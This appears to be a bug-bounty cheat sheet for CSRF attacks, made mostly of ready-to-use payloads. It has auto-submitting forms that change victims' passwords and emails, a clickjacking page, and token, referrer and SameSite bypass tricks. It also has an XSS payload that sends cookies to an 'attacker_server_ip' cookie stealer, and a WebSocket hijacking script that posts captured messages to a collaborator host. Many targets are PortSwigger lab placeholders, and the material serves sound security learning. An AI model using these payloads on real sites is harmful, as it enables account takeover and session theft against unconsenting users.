For CSRF vulns we usually require a webpage hosted on the internet to display its impact hence you can either use Burp-Suite 
CSRF-poc generator or could use services like Interactsh and put in your code in it..

Start hunting!!
1) Look for state changing requests 
2) Look for lack of csrf protection, like no csrt-token header, or no samesite=lax/strict headers
3) Craft a POC
<html>
<form method="POST" action="https://email.example.com/password_change" id="csrf-form"> 1
<input type="text" name="new_password" value="abc123"> 2
<input type="submit" value="Submit"> 3
</form>
<script>document.getElementById("csrf-form").submit();</script> 
</html>

Bypasses
Exploit Clickjacking
html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
<iframe src="PAGE_URL" width="500" height="500"></iframe>
</body>
</html>

bypass csrf-token protection
	Circumventing strategies
	Turn post request to get
	Server doesnâ€™t give a damn abt whose csrf token put your own accounts :)
	Add tag, Meta name="referrer" content="never"
	If server wants the domain name use @ in the link
	If the server only domain name try buying a subdomain
  
bypass referrer header check by 
<meta name="referrer" content="no-referrer">

Self XSS by CSRF
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
&csrf_token='' - leave blank

injects XSS in nickname field and steals the cookies

CSRF POC
<html>
<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
<input type="text" name="new_password" value="this_account_is_now_mine">
<input type='submit' value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</html>

Bypass using XSS as mentioned in the XSS guide in this repo :)

Samesite: lax bypass via method override
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1

via client side redirect
document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";

CSRF through cross site websocket hijacking
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>


Bypass popup and samesite via cookie refresh
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>


Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net then add in poc
Referrer-Policy: unsafe-url


